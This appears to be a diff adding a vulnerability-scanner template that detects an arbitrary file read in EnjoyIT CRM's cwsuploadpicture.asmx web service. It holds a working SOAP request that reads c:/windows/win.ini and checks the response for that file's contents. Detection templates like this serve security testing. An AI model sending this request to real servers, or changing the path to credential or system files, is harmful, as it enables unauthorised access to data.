@@ -1,0 +1,36 @@
+id: enjoyit-crm-cwsuploadpicture-file-read
+info:
+  name: EnjoyIT CRM cwsuploadpicture.asmx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetPicture"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetPicture xmlns="http://tempuri.org/">
+              <sFullFileName>c:/windows/win.ini</sFullFileName>
+            </GetPicture>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<GetPictureResult>"
+          - "Yml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10N"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
